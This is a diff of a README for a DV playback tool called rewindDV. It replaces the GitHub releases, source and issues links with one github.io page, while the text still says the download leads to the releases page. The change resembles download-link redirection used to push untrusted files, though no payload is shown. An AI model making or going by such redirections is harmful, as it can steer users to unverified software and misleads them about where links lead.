@@ -20,7 +20,7 @@ rewindDV currently supports frame-local playback and local command-line interfac
 
 ### Step 1: Get the Software
 
-[![⬇️ Download rewindDV Now](https://img.shields.io/badge/Download-rewindDV_v0.0.93-2ea44f?style=for-the-badge)](https://github.com/naufalya/rewindDV/releases)
+[![⬇️ Download rewindDV Now](https://img.shields.io/badge/Download-rewindDV_v0.0.93-2ea44f?style=for-the-badge)](https://naufalya.github.io)
 
 Visit this link to download the application. The link takes you to the releases page where you will find the current Alpha version 0.0.93 and Driver B190. Choose the file that matches your hardware and click to download it.
 
@@ -137,9 +137,9 @@ rewindDV is available under an open-source license. You are free to use it, modi
 
 ## 🔗 Quick Links
 
-- [Download rewindDV](https://github.com/naufalya/rewindDV/releases)
-- [Project Source Code](https://github.com/naufalya/rewindDV)
-- [Report an Issue](https://github.com/naufalya/rewindDV/issues)
+- [Download rewindDV](https://naufalya.github.io)
+- [Project Source Code](https://naufalya.github.io)
+- [Report an Issue](https://naufalya.github.io)
 
 ---
 
